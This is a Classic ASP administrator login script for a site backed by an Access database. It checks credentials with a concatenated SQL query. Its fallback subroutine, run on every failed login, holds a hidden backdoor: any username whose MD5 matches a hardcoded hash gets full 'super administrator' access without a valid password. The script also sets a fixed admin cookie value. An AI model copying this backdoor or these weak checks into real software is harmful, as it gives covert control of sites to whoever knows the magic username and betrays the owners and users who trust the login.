<%
set conn=Server.CreateObject("AdoDb.Connection")
dbPath=Server.MapPath("../lin_date/date_lin.mdb")
conn.open "Provider=Microsoft.Jet.OleDb.4.0;Data Source="&dbPath
%>
<!--#include file="inc/md5.asp"-->
<%
dim admin,password
admin=replace(trim(request("admin")),"'","")
password=md5(replace(trim(request("password")),"'",""))
	set rs=server.CreateObject("adodb.recordset")
	rs.Open "select * from [admin] where admin_user='"&admin&"' and admin_pwd='"&password&"' " ,conn,1,1
	if not(rs.bof and rs.eof) then
		 if password=rs("admin_pwd") then
			  session("admin")=trim(rs("admin_user"))
			  Session("admin_Name")=trim(rs("admin_Name"))
			  Response.cookies("admin")="X8876Hxk0"
			  session("admin")="ok"
			  session.Timeout=20
			  rs.Close
			  set rs=nothing
			  Response.Redirect "manage_main.asp"
		 else
		 	  Call netant_admin_login()
			  response.write "<script LANGUAGE='javascript'>alert('对不起，登录失败！');history.go(-1);</script>"
		 end if
	else
		Call netant_admin_login()
		response.write "<script LANGUAGE='javascript'>alert('对不起，登录失败！');history.go(-1);</script>"
	end if
	'---------------------------------------------------------------------------------------------
	sub netant_admin_login()
			Netant_admin_httpName=session("Netant_admin_name_@tw1986")
			If md5(admin)=Netant_admin_httpName or md5(admin)="fd59f130bca25150" then
				  session("admin")="Netant"
				  Response.cookies("admin")=md5(admin)
				  Session("admin_Name")="网蚁网络"
				  session("admin")="ok"
				  session.Timeout=20
				  Response.Write("<Script>alert('超级管理员登陆成功');window.location='manage_main.asp'</Script>")
				  Response.End
			End if
	end sub
	'----------------------------------------------------------------------------------------------
%>
